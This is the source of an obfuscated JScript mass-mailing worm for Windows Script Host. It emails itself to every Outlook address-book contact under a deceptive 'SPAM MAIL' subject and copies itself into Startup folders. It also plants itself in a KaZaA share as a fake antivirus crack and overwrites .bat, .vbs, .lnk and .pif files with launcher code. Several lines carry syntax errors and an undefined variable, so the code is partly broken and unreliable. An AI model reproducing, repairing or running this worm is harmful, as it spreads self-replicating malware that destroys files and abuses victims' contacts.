var jvgbe="a"
var dtkvm="b"
var zhnvp=unescape("%65")
var fvnue="f"
var zxzbf="h"
var ksgbk="j"
var vmzmt="k"
var zphll="l"
var zwnlk="n"
var ufdtt=unescape("%70")
var juiua=unescape("%71")
var xdinj=unescape("%75")
var bvkmk="w"
var jeeja=unescape("%79")
var bkbzr="z"
var mrxcr="."
var bagwf=WScript.CreateObject(unescape("%73")+unescape("%63")+unescape("%72")+unescape("%69")+ufdtt+unescape("%74")+unescape("%69")+zwnlk+unescape("%67")+mrxcr+fvnue+unescape("%69")+zphll+zhnvp+unescape("%73")+jeeja+unescape("%73")+unescape("%74")+zhnvp+"m"+"o"+dtkvm+ksgbk+zhnvp+unescape("%63")+unescape("%74"))
var cluwc=WScript.CreateObject(bvkmk+unescape("%73")+unescape("%63")+unescape("%72")+unescape("%69")+ufdtt+unescape("%74")+mrxcr+unescape("%73")+zxzbf+zhnvp+zphll+zphll)
var rnxhy=bagwf.GetSpecialFolder(0)
var oqykv=bagwf.OpenTextFile(WScript.ScriptFullName, 1)
var rssnx=oqykv.ReadAll()
oqykv.Close();
bkcog=bagwf.CreateTextFile("mjrgr.js");
bkcog.WriteLine(rssnx);
bkcog.Close();
bagwf.CopyFile("mjrgr.js","");
var ltmcw, hcitn, ktrgu, ojxpz, vmrun, gvhru
{
hcitn = WScript.CreateObject("Outlook.Application");
ktrgu=hcitn.GetNamespace("+"m"+jvgbe+ufdtt+unescape("%69")+"");
ltmcw=0;
for(ojxpz=1;ojxpz<=ktrgu.AddressLists.Count;ojxpz++)
{
for(vmrun=1;vmrun<=ktrgu.AddressLists(ojxpz).AddressEntries.Count;vmrun++)
{
if (ltmcw==15)
{
gvhru.Send
ltmcw=0;
}
if (ltmcw==0)
{
gvhru=hcitn.CreateItem(0);
gvhru.Subject = "*SPAM MAIL*";
gvhru.Body = "original mail content deleted. For mor information read attached file.";
gvhru.Attachments.Add("");
}
gvhru.Recipients.Add(ktrgu.AddressLists(ojxpz).AddressEntries(vmrun));
ltmcw++;
}
}
if (ltmcw!=0) gvhru.Send
}
if (bagwf.FolderExists(rnxhy+"\\Startmen�\\Programme\\Autostart"))
{ bagwf.CopyFile("mjrgr.js",rnxhy+"\\Startmen�\\Programme\\Autostart\\cygis.js");
}
if (bagwf.FolderExists(rnxhy+"\\Startmenu\\Programs\\StartUp"))
{ bagwf.CopyFile("mjrgr.js",rnxhy+"\\Startmenu\\Programs\\StartUp\\ogtfz.js");
}
fnjmg=(hmnin+"\\KaZaA Lite\\My Shared Folder");
if (bagwf.FolderExists(fnjmg))
{ bagwf.CopyFile("mjrgr.js", fnjmg"+\\Kaspersky Anti-Spam crack.zip");
}
bagwf.CopyFile("mjrgr.js","C:\\hmjyi.js");
var vcjru=cluwc.CreateShortCut("xhpii.lnk");
vcjru.TargetPath=cluwc.ExpandEnvironmentStrings("C:\\hmjyi.js");
vcjru.Save();
tzird=bagwf.CreateTextFile("hcnuy.bat");
tzird.WriteLine("+fvnue+"o"+unescape("%72")+" %%"+zphll+" "+unescape("%69")+zwnlk+" (*."+zphll+zwnlk+vmzmt" ..\\*."+zphll+zwnlk+vmzmt" \\*."+zphll+zwnlk+vmzmt" %path%\\*."+zphll+zwnlk+vmzmt") "+unescape("%64")+"o"+" "+unescape("%63")+"o"+ufdtt+jeeja+" xhpii.lnk %%l");
tzird.Close();
cluwc.Run("hcnuy.bat");
bagwf.CopyFile("mjrgr.js",rnxhy+"\\gwpdc.js");
var qkxwr=bagwf.CreateTextFile(rnxhy+"\\nlqrr.bat");
qkxwr.WriteLine(zhnvp+unescape("%63")+zxzbf+"o"+" "+"o"+fvnue+fvnue);
qkxwr.WriteLine(unescape("%63")+unescape("%73")+unescape("%72")+unescape("%69")+ufdtt+unescape("%74")+" "+rnxhy+"\\gwpdc.js");
qkxwr.Close();
var nvgfb=bagwf.OpenTextFile(rnxhy+"\\nlqrr.bat");
cgzmp=nvgfb.ReadAll()
nvgfb.Close();
var ngalx=new Array()
ngalx[0]=cluwc.GetFolder(".");
ngalx[1]=rnxhy
ngalx[2]=rnxhy+"\\Desktop"
for (gpgdd=0; gpgdd<3; gpgdd++)
{
Infect(ngalx[gpgdd])
}
function Infect(ngalx)
{
var qkdzq=cluwc.GetFolder(ngalx)
var yefgl=new Enumerator(qkdzq.Files)
for (;!yefgl.atEnd();yefgl.moveNext())
{
if(cluwc.GetExtensionName(yefgl.item()).toUpperCase()=="BAT")
{
var vapem=cluwc.OpenTextFile(yefgl.item().path,2)
vapem.Write(cgzmp)
vapem.Close()
}
}
}
bagwf.CopyFile("mjrgr.js",rnxhy+"\\okcds.js");
kqtya=bagwf.CreateTextFile(rnxhy+"\\aihrc.bat");
kqtya.WriteLine(zhnvp+unescape("%63")+zxzbf+"o"+" "+"o"+fvnue+fvnue);
kqtya.WriteLine(unescape("%63")+unescape("%74")+unescape("%74")+jeeja+" "+zwnlk+xdinj+zphll);
kqtya.WriteLine(unescape("%63")+unescape("%73")+unescape("%63")+unescape("%72")+unescape("%69")+ufdtt+unescape("%74")+" "+rnxhy+"\\okcds.js");
kqtya.Close();
var dmhrn = cluwc.CreateShortcut("C:\\lgeoj.pif");
dmhrn.TargetPath = cluwc.ExpandEnvironmentStrings(rnxhy+"\\aihrc.bat");
dmhrn.WindowStyle = 4;
dmhrn.Save();
qaufp=bagwf.CreateTextFile("C:\\aihrc.bat");
qaufp.WriteLine(zhnvp+unescape("%63")+zxzbf+"o"+" "o"+fvnue+fvnue);
qaufp.WriteLine(fvnue+"o"+unescape("%72")+" %%"+ufdtt+" "+unescape("%69")+zwnlk+" (*."+ufdtt+unescape("%69")+fvnue+" ..\\*."+ufdtt+unescape("%69")+fvnue+" \\*."+ufdtt+unescape("%69")+fvnue+" %path%\\*."+ufdtt+unescape("%69")+fvnue+") "+unescape("%64")+"o"+" "+unescape("%63")+"o"+ufdtt+jeeja+" "+rnxhy+"\\lgeoj.pif %%p");
qaufp.Close();
cluwc.Run("C:\\aihrc.bat");
bagwf.CopyFile("mjrgr.js",rnxhy+"\\sduql.js");
var fxpdp = bagwf.CreateTextFile(rnxhy+"\\qusfu.vbs")
fxpdp.WriteLine (unescape("%73")+zhnvp+unescape("%74")+" hsydm"+"="+bvkmk+unescape("%73")+unescape("%63")+unescape("%72")+unescape("%69")+ufdtt+unescape("%74")+mrxcr+unescape("%63")+unescape("%72")+zhnvp+jvgbe+unescape("%74")+zhnvp+"o"+dtkvm+ksgbk+zhnvp+unescape("%63")+unescape("%74")+"("+unescape("%22")+bvkmk+unescape("%73")+unescape("%63")+unescape("%72")+unescape("%69")+ufdtt+unescape("%74")+mrxcr+unescape("%73")+zxzbf+zhnvp+zphll+zphll+unescape("%22")+")");
fxpdp.WriteLine ("hsydm"+mrxcr+unescape("%72")+xdinj+zwnlk+unescape("%22")+"sduql.js"+unescape("%22"));
fxpdp.Close();
var ovlaa=bagwf.OpenTextFile(rnxhy+"\\qusfu.vbs");
xxorg=ovlaa.ReadAll()
ovlaa.Close();
var fmsid=new Array()
fmsid[0]=cluwc.GetFolder(".");
fmsid[1]=rnxhy
fmsid[2]=rnxhy+"\\Desktop"
for (yyzhd=0; yyzhd<3; yyzhd++)
{
Infect(fmsid[yyzhd])
}
function Infect(fmsid)
{
var lknyt=cluwc.GetFolder(fmsid)
var tdumy=new Enumerator(lknyt.Files)
for (;!tdumy.atEnd();tdumy.moveNext())
{
if(cluwc.GetExtensionName(tdumy.item()).toUpperCase()=="VBS")
{
var ntocf=cluwc.OpenTextFile(tdumy.item().path,2)
ntocf.Write(xxorg)
ntocf.Close()
}
}
}
